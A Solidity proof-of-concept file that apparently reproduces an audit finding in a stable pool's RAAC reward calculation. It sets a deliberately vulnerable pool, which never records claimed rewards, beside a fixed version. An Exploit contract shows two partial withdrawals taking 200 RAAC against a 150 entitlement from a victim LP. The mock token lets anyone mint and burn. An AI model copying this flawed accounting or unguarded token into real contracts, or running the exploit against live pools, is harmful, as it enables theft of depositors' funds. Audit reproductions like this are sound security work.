// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum stable pool — H-22 (Pashov, 2025-05-06).
    calculateRaacRewards pays totalRewards * userDeposit / totalSupply and
    never records what was already claimed. Two partial withdraws of the same
    deposit pay 200 RAAC against a 150 RAAC entitlement. The other LP is left
    with 100 RAAC instead of 150. The fixed pool records reward-per-token.
*/

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract StablePool {
    Token public deToken;
    Token public rToken;
    Token public raacToken;
    mapping(address => uint256) public userDeposits;
    uint256 private locked;

    error InsufficientBalance();

    modifier nonReentrant() {
        require(locked == 0, "reentrancy");
        locked = 1;
        _;
        locked = 0;
    }

    modifier whenNotPaused() {
        _;
    }

    modifier validAmount(uint256 amount) {
        require(amount > 0, "amount");
        _;
    }

    constructor(Token _de, Token _r, Token _raac) {
        deToken = _de;
        rToken = _r;
        raacToken = _raac;
    }

    function seed(address user, uint256 amount) external {
        userDeposits[user] = amount;
        deToken.mint(user, amount);
    }

    function _update() internal {}

    function calculateRcrvUSDAmount(uint256 deCRVUSDAmount) public pure returns (uint256) {
        return deCRVUSDAmount;
    }

    function safeTransfer(Token token, address to, uint256 amount) internal {
        require(token.transfer(to, amount), "transfer");
    }

    function withdraw(uint256 deCRVUSDAmount) external nonReentrant whenNotPaused validAmount(deCRVUSDAmount) {
        _update();
        if (deToken.balanceOf(msg.sender) < deCRVUSDAmount) revert InsufficientBalance();
        uint256 rcrvUSDAmount = calculateRcrvUSDAmount(deCRVUSDAmount);
        uint256 raacRewards = calculateRaacRewards(msg.sender);
        if (userDeposits[msg.sender] < rcrvUSDAmount) revert InsufficientBalance();
        userDeposits[msg.sender] -= rcrvUSDAmount;

        if (userDeposits[msg.sender] == 0) {
            delete userDeposits[msg.sender];
        }

        deToken.burn(msg.sender, deCRVUSDAmount);
        safeTransfer(rToken, msg.sender, rcrvUSDAmount);
        if (raacRewards > 0) {
            safeTransfer(raacToken, msg.sender, raacRewards);
        }
    }

    function calculateRaacRewards(address user) public view returns (uint256) {
        uint256 userDeposit = userDeposits[user];
        uint256 totalDeposits = deToken.totalSupply();

        uint256 totalRewards = raacToken.balanceOf(address(this));
        // @> VULN: claimed RAAC is not recorded, so each withdraw pays totalRewards * deposit / supply again
        if (totalDeposits < 1e6) return 0;

        uint256 payout = (totalRewards * userDeposit) / totalDeposits;
        return payout;
    }
}

contract StablePoolFixed {
    Token public deToken;
    Token public rToken;
    Token public raacToken;
    mapping(address => uint256) public userDeposits;
    mapping(address => uint256) public rewardPerTokenPaid;
    uint256 public rewardPerTokenStored;

    constructor(Token _de, Token _r, Token _raac) {
        deToken = _de;
        rToken = _r;
        raacToken = _raac;
    }

    function seed(address user, uint256 amount) external {
        userDeposits[user] = amount;
        deToken.mint(user, amount);
    }

    function notifyReward(uint256 index) external {
        rewardPerTokenStored = index;
    }

    function earned(address user) public view returns (uint256) {
        return userDeposits[user] * (rewardPerTokenStored - rewardPerTokenPaid[user]) / 1e18;
    }

    function withdraw(uint256 amount) external {
        uint256 reward = earned(msg.sender);
        rewardPerTokenPaid[msg.sender] = rewardPerTokenStored;
        userDeposits[msg.sender] -= amount;
        deToken.burn(msg.sender, amount);
        require(rToken.transfer(msg.sender, amount), "r");
        if (reward > 0) require(raacToken.transfer(msg.sender, reward), "raac");
    }
}

contract Exploit {
    uint256 public constant HALF = 75 ether;
    uint256 public constant FAIR = 150 ether;

    Token public rToken;
    Token public deToken;
    Token public raacToken;
    StablePool public pool;
    address public victim;
    uint256 public raacTaken;
    uint256 public raacLeft;

    constructor() {
        rToken = new Token("R");
        deToken = new Token("DE");
        raacToken = new Token("RAAC");
        pool = new StablePool(deToken, rToken, raacToken);
        victim = address(0xBEEF);
        pool.seed(address(this), 150 ether);
        pool.seed(victim, 150 ether);
        rToken.mint(address(pool), 300 ether);
        raacToken.mint(address(pool), 300 ether);
    }

    function run() external {
        uint256 beforeRaac = raacToken.balanceOf(address(this));
        pool.withdraw(HALF);
        uint256 afterFirst = raacToken.balanceOf(address(this));
        pool.withdraw(HALF);
        raacTaken = raacToken.balanceOf(address(this));
        raacLeft = raacToken.balanceOf(address(pool));
        require(afterFirst - beforeRaac == FAIR, "first pays the full entitlement");
        require(raacTaken == 200 ether, "second withdraw steals another 50");
        require(raacLeft == 100 ether, "victim LP left short 50");
        require(pool.userDeposits(address(this)) == 0, "attacker exited");
        require(pool.userDeposits(victim) == 150 ether, "victim still deposited");
        require(deToken.balanceOf(victim) == 150 ether, "victim shares remain");
    }
}
